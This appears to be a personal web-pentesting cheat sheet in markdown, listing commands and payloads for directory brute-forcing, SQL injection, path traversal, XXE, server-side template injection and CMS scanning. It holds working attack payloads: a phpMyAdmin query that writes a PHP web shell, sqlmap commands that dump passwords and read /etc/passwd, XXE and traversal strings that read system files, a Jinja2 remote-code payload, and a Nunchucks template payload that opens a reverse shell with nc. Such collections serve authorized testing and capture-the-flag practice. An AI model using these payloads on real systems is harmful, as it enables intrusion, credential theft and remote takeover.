# 🕸️ Web

- [BruteForce](#bruteforce)
- [Download .git](#download-git)
- [Influx DB](#influx-db)
- [Interesting routes](#interesting-routes)
- [Mysql](#mysql)
- [Path traversal](#path-traversal)
- [PhpMyAdmin](#phpmyadmin)
- [Request](#request)
- [SQL Injection](#sql-injection)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [SSTI](#ssti)
- [CMS](#cms)

## BruteForce
### Wordlist

| Name                      | Path                                                                    |
|:--------------------------|:------------------------------------------------------------------------|
| SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |

### Extensions

| Type    | Extension      |
|:--------|:---------------|
| Script  | `php,js,twig`  |
| Text    | `html,txt,md`  |
| Linux   | `sh,bin`       |
| Windows | `ps1,exe`      |

### ffuf
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
```
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
```

### Gobuster
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Feroxbuster
```bash
feroxbuster -u <url> -e -x html,js,php
```

### Dirb
```bash
dirb url -R
```

### GUI
```bash
dirbuster
```
```bash
owasp-zap
```

## PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

## MySql
### Connect to mysql
```bash
mysql -h localhost -u myname -p
```
### Show Info
```
SHOW DATABASES;
use db_name
SHOW TABLES;
select * from table_name
```
### Open SQLite3
```bash
sqlite3 database.sqlite3
```
or open in vs code

## Influx DB

[CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

```
> show databases # to display databases
> show field keys # field keys (like columns in sql)
> show measurements # to display measurements (like tables in sql)
{
  ...
  "results": [
    "values": [
        [
            <strong>"foo"</strong>
        ]
    ]
  ...
}
> select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
```

## Dynamodb

See [this page](../wiki/Cloud.md)

## SQL Injection
### SQLmap
```bash
# See Vulnerability
sqlmap -r req --batch
# Check Passwords
sqlmap -r req --batch --passwords
# Get DB
sqlmap -r req --batch --dbs
sqlmap -r req --batch --fetch --tables -D db
sqlmap -r req --batch --dump -T table -D db
# Check Privilege of DB
sqlmap -r req --privileges
# Read file
sqlmap -r req --file-read=/etc/passwd
```

### Turbo SQLmap
```bash
sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
```

### Pattern
```
" OR ""="
' OR ''='
' OR 1=1 -- comment
```

## Request
### Curl
```bash
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=login&password=pass'
```

### Python (requests)
```python
import requests

s = requests.session()
# s.proxies = {
#   "http": "localhost:8080",
#   "https": "localhost:8080",
# }

r = s.get('http://example.com')
print(r.text)
r = s.post('http://example.com/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
    # auth=('username', 'password')
)
print(r.status_code, r.url)
```

## Path traversal

[Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)

[File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

```
︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
```

## Download .git
```bash
githacker --url http://url/.git/ --folder result
```
[Source](https://github.com/WangYihang/GitHacker)

## XML external entity (XXE)
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```

## SSTI
[Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

#### Nunchucks (Nodejs)
```
{{range.constructor("console.log(123)")()}} => 123
{{range.constructor("return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f')")()}}
```

#### Python (Jinja2)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

#### Golang
```
{{.}}
```

## CMS
#### Scaning
```bash
wpscan --force update -e --url IP --disable-tls-checks
```

## Interesting routes
### Graphql

```
/graphql
/graphiql
/graphql.php
/graphql/console
```

## Certificate
```
curl <url> --key KEY.key --cert CERT.cert
```